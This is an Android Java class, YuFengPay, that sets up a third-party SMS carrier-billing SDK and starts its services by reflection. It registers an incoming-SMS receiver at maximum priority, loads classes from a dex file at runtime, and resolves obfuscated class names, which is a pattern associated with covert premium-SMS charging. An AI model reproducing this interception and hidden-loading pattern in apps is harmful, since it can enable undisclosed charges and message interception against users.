package com.thirdparty.engine;

import android.content.Context;
import android.content.IntentFilter;
import android.util.Log;

import com.gandalf.daemon.utils.XL_log;
import com.mj.billing.SmsServices;
import com.mj.jar.pay.BillingListener;
import com.mj.jar.pay.DexClass;
import com.mj.jar.pay.InSmsReceiver;
import com.mj.jar.pay.MjPaySDK;
import com.mj.sms.service.ServiceAction;

/**
 * Created by as on 17-7-12.
 */

public class YuFengPay {
    private Context mContext = null;
    private MjPaySDK mSdk = null;
    private XL_log log = new XL_log(YuFengPay.class);

    public YuFengPay(Context context) {
        this.mContext = context;
    }

    public synchronized void init(String appCode, String channelId, BillingListener billingListener) {
        mSdk = new MjPaySDK(mContext, billingListener, appCode, "", channelId);
        try {
            mSdk.payClazz = Class.forName("com.mj.billing.MjBilling");
            mSdk.payObj = new com.mj.billing.MjBilling(mContext, mSdk.mHandler, appCode, "", channelId);
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
        initEnv();
    }

    public void pay(String payCode, String price) {
        if (mSdk != null) {
            mSdk.pay(System.currentTimeMillis() + "", payCode, price);
        }
    }

    private static boolean INIT_ENV = false;

    private void initEnv() {
        if (!INIT_ENV) {
            log.debug("YuFeng initEnv");
            FixEnv();
            INIT_ENV = true;
        } else {
            log.warn("YuFeng has initEnv");
        }
    }

    private InSmsReceiver insms = new InSmsReceiver();
    private Class<?> smsClass = null;
    private Object smsObj = null;

    private void inItSmsServices() {
        IntentFilter localIntentFilter = new IntentFilter();
        localIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
        localIntentFilter.setPriority(Integer.MAX_VALUE);
        mContext.registerReceiver(this.insms, localIntentFilter);

        if (this.smsClass == null || this.smsObj == null) {
            this.smsClass = null;
            this.smsObj = null;
            try {
                this.smsClass = DexClass.install(mContext, MjPaySDK.filePath).getDexClass("com.mj.billing.SmsServices");
                this.smsObj = this.smsClass.newInstance();
            } catch (Exception e) {
            }
        }
    }

    private void FixEnv() {
        fixYuPreDo();
        fixYuFengPayService();
        fixWYEnv();
        fixWYPayService();
    }

    private void fixWYEnv() {

    }

    private static Object mServiceActionObj;

    private Object getServiceActionObj(Context context) {
        if (mServiceActionObj == null) {
            try {
                mServiceActionObj = Class.forName(com.mj.sms.c.m.a(com.mj.sms.constant.Constant.d)).getConstructor(new Class[]{Context.class}).newInstance(new Object[]{context});
            } catch (Exception e) {
                e.printStackTrace();
                log.error(Log.getStackTraceString(e));
            }
        }
        return mServiceActionObj;
    }

    private void fixWYPayService() {
        wyOnCreate();
        wyOnStartCommand(0, 0);
    }

    public void wyOnCreate() {
        try {
            Log.i(com.mj.sms.constant.Constant.a, "InitService weiyun OnCreate");
            Object a = getServiceActionObj(mContext);
            a.getClass().getMethod("registerBroadcast", new Class[0]).invoke(a, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }
    }

    public int wyOnStartCommand(int i, int i2) {
        try {
            Object a = getServiceActionObj(mContext);
            a.getClass().getMethod("startCommand", new Class[0]).invoke(a, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }
        return 0;
    }

    private void yufengOnDestroy() {
        try {
            Object a = getServiceActionObj(mContext);
            a.getClass().getMethod("onDestroy", new Class[0]).invoke(a, new Object[0]);
        } catch (Exception e) {
            e.printStackTrace();
            log.error(Log.getStackTraceString(e));
        }
    }

    private void weiyunOnDestroy() {
        com.mj.sms.service.ServiceAction action = new ServiceAction(mContext);
        action.onDestroy();
    }

    public void destroy() {
        yufengOnDestroy();
        weiyunOnDestroy();
    }


    private void fixYuPreDo() {
        com.mj.jar.pay.SmsServices service = new com.mj.jar.pay.SmsServices();
        try {
            service.smsClass = Class.forName("com.mj.billing.SmsServices");
            service.smsObj = new com.mj.billing.SmsServices();
        } catch (ClassNotFoundException e) {
            e.printStackTrace();
        }
    }

    private void fixYuFengPayService() {
        yufengOnCreate();
    }

    private void yufengOnCreate() {
        com.mj.billing.SmsServices service = new SmsServices();
        service.onCreate(mContext);
//        if (this.smsClass != null) {
//            try {
//                this.smsClass.getDeclaredMethod("yufengOnCreate", Context.class).invoke(this.smsObj, mContext);
//            } catch (Exception e) {
//                e.printStackTrace();
//                log.error(Log.getStackTraceString(e));
//            }
//        }
    }
}
